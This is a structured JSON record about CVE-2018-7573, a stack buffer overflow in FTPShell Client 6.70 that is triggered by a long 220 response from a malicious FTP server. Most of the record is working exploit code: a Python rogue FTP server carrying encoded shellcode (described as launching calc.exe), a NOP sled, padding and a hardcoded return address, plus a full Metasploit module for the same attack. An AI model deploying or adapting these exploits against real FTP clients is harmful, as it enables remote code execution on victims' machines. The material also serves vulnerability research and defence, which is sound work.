```
{
  "cve": "CVE-2018-7573",
  "description": "The provided content describes a stack buffer overflow vulnerability in FTPShell Client v6.7 and 6.70 (Enterprise Edition).",
  "vulnerability_details": {
    "root_cause": "The vulnerability is due to insufficient bounds checking when handling a long directory string sent by the server in the FTP response. Specifically, when the client receives a `220` response from the FTP server, it copies the string into a fixed-size buffer on the stack.",
    "weaknesses": [
      "Stack buffer overflow",
       "Insufficient bounds checking"
    ],
    "impact": "Successful exploitation allows a remote attacker to execute arbitrary code on the victim's machine by overwriting the return address on the stack.",
    "attack_vectors": "A malicious FTP server can send an overly long string in the 220 response to trigger the buffer overflow in the client.",
    "attacker_capabilities": "The attacker needs to control an FTP server or perform a man-in-the-middle attack to send the malicious response to the client."
  },
  "affected_versions": [
    "FTPShell Client v6.7",
    "FTPShell Client v6.70 Enterprise Edition"
  ],
  "patch_information": "The provided text does not contain any patch information. Users should seek vendor updates or consider using a different client.",
    "exploits": [
        {
            "exploit_details": "The provided python script is a proof of concept for the vulnerability. It sets up a malicious FTP server that sends a crafted '220' response containing the malicious payload. The payload consists of NOPs, shellcode to execute calc.exe and junk bytes to fill the buffer, and a return address to redirect execution to the shellcode.",
             "exploit_code": [
                "import socket",
                "import sys",
                "port = 21",
                "buf =  \"\"",
                "buf += \"\\xdb\\xc8\\xba\\x3e\\x93\\x15\\x8f\\xd9\\x74\\x24\\xf4\\x5e\\x33\"",
                "buf += \"\\xc9\\xb1\\x31\\x31\\x56\\x18\\x03\\x56\\x18\\x83\\xc6\\x3a\\x71\"",
                "buf += \"\\xe0\\x73\\xaa\\xf7\\x0b\\x8c\\x2a\\x98\\x82\\x69\\x1b\\x98\\xf1\"",
                "buf += \"\\xfa\\x0b\\x28\\x71\\xae\\xa7\\xc3\\xd7\\x5b\\x3c\\xa1\\xff\\x6c\"",
                "buf += \"\\xf5\\x0c\\x26\\x42\\x06\\x3c\\x1a\\xc5\\x84\\x3f\\x4f\\x25\\xb5\"",
                "buf += \"\\x8f\\x82\\x24\\xf2\\xf2\\x6f\\x74\\xab\\x79\\xdd\\x69\\xd8\\x34\"",
                "buf += \"\\xde\\x02\\x92\\xd9\\x66\\xf6\\x62\\xdb\\x47\\xa9\\xf9\\x82\\x47\"",
                "buf += \"\\x4b\\x2e\\xbf\\xc1\\x53\\x33\\xfa\\x98\\xe8\\x87\\x70\\x1b\\x39\"",
                "buf += \"\\xd6\\x79\\xb0\\x04\\xd7\\x8b\\xc8\\x41\\xdf\\x73\\xbf\\xbb\\x1c\"",
                "buf += \"\\x09\\xb8\\x7f\\x5f\\xd5\\x4d\\x64\\xc7\\x9e\\xf6\\x40\\xf6\\x73\"",
                "buf += \"\\x60\\x02\\xf4\\x38\\xe6\\x4c\\x18\\xbe\\x2b\\xe7\\x24\\x4b\\xca\"",
                "buf += \"\\x28\\xad\\x0f\\xe9\\xec\\xf6\\xd4\\x90\\xb5\\x52\\xba\\xad\\xa6\"",
                "buf += \"\\x3d\\x63\\x08\\xac\\xd3\\x70\\x21\\xef\\xb9\\x87\\xb7\\x95\\x8f\"",
                "buf += \"\\x88\\xc7\\x95\\xbf\\xe0\\xf6\\x1e\\x50\\x76\\x07\\xf5\\x15\\x88\"",
                "buf += \"\\x4d\\x54\\x3f\\x01\\x08\\x0c\\x02\\x4c\\xab\\xfa\\x40\\x69\\x28\"",
                "buf += \"\\x0f\\x38\\x8e\\x30\\x7a\\x3d\\xca\\xf6\\x96\\x4f\\x43\\x93\\x98\"",
                "buf += \"\\xfc\\x64\\xb6\\xfa\\x63\\xf7\\x5a\\xd3\\x06\\x7f\\xf8\\x2b\"",
                "try:",
                "    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)",
                "    s.bind((\"0.0.0.0\", port))",
                "    s.listen(5)",
                "    print(\"[+] FTP server started on port: \"+str(port)+\"\\r\\n\")",
                "except:",
                "    print(\"[x] Failed to start the server on port: \"+str(port)+\"\\r\\n\")",
                 "eip = \"\\xed\\x2e\\x45\" # CALL ESI from FTPShell.exe : 0x00452eed",
                 "nops = \"\\x90\"*40",
                 "junk = \"F\"*(400 - len(nops) - len(buf))",
                 "payload = nops + buf + junk + eip",
                "while True:",
                "    conn, addr = s.accept()",
                "    conn.send('220 FTP Server\\r\\n')",
                "    print(conn.recv(1024))",
                "    conn.send(\"331 OK\\r\\n\")",
                "    print(conn.recv(1024))",
                "    conn.send('230 OK\\r\\n')",
                "    print(conn.recv(1024))",
                "    conn.send('220 \"'+payload+'\" is current directory\\r\\n')"
             ],
              "metasploit_module": {
                "description":"This module exploits a buffer overflow in the FTPShell client 6.70 (Enterprise edition) allowing remote code execution.",
                 "code":[
                   "class MetasploitModule < Msf::Exploit::Remote",
                    "Rank = NormalRanking",
                    "include Msf::Exploit::Remote::TcpServer",
                    "def initialize(info = {})",
                        "super(update_info(info,",
                            "'Name'           => 'FTPShell client 6.70 (Enterprise edition) Stack Buffer Overflow',",
                            "'Description'    => %q{",
                               "This module exploits a buffer overflow in the FTPShell client 6.70 (Enterprise",
                                "edition) allowing remote code execution.",
                                "},",
                            "'Author'   =>",
                                "[",
                                   "'r4wd3r',           # Original exploit author",
                                    "'Daniel Teixeira'   # MSF module author",
                                "],",
                           "'License'        => MSF_LICENSE,",
                           "'References'     =>",
                                "[",
                                    "[ 'CVE', '2018-7573'],",
                                    "[ 'EDB', '44596' ]",
                                "],",
                           "'Payload'        =>",
                                "{",
                                    "'Space'    => 400,",
                                    "'BadChars' => \"\\x00\\x22\\x0d\\x0a\\x0b\"",
                                "},",
                            "'Platform'       => 'win',",
                           "'Targets'        =>",
                                "[",
                                   "# CALL ESI in FTPShell.exe : 0x00452eed",
                                   "[ 'Windows Universal', {'Ret' => \"\\xed\\x2e\\x45\" } ]",
                                "],",
                            "'Privileged'     => false,",
                           "'DefaultOptions' =>",
                                "{",
                                   "'SRVHOST' => '0.0.0.0',",
                                   "'EXITFUNC' => 'thread'",
                                "},",
                           "'DisclosureDate' => 'Mar 4 2017',",
                           "'DefaultTarget'  => 0))",
                           "register_options [ OptPort.new('SRVPORT', [ true, 'The FTP port to listen on', 21 ]) ]",
                    "end",
                     "def exploit",
                        "srv_ip_for_client = datastore['SRVHOST']",
                        "if srv_ip_for_client == '0.0.0.0'",
                           "if datastore['LHOST']",
                                 "srv_ip_for_client = datastore['LHOST']",
                            "else",
                                  "srv_ip_for_client = Rex::Socket.source_address('50.50.50.50')",
                            "end",
                       "end",
                       "srv_port = datastore['SRVPORT']",
                       "print_status(\"Please ask your target(s) to connect to #{srv_ip_for_client}:#{srv_port}\")",
                       "super",
                    "end",
                   "def on_client_connect(client)",
                        "p = regenerate_payload(client)",
                        "return if p.nil?",
                       "print_status(\"#{client.peerhost} - connected.\")",
                       "res = client.get_once.to_s.strip",
                       "print_status(\"#{client.peerhost} - Request: #{res}\") unless res.empty?",
                       "print_status(\"#{client.peerhost} - Response: Sending 220 Welcome\")",
                        "welcome = \"220 Welcome.\\r\\n\"",
                       "client.put(welcome)",
                       "res = client.get_once.to_s.strip",
                       "print_status(\"#{client.peerhost} - Request: #{res}\")",
                        "print_status(\"#{client.peerhost} - Response: sending 331 OK\")",
                       "user = \"331 OK.\\r\\n\"",
                        "client.put(user)",
                        "res = client.get_once.to_s.strip",
                        "print_status(\"#{client.peerhost} - Request: #{res}\")",
                       "print_status(\"#{client.peerhost} - Response: Sending 230 OK\")",
                       "pass = \"230 OK.\\r\\n\"",
                       "client.put(pass)",
                        "res = client.get_once.to_s.strip",
                       "print_status(\"#{client.peerhost} - Request: #{res}\")",
                        "sploit = '220 \"'",
                        "sploit << payload.encoded",
                        "sploit << \"\\x20\" * (payload_space - payload.encoded.length)",
                        "sploit << target.ret",
                       "sploit << \"\" is current directory\\r\\n\"",
                       "print_status(\"#{client.peerhost} - Request: Sending the malicious response\")",
                       "client.put(sploit)",
                     "end",
                   "end"
              ]
            }
        }
    ]
}
```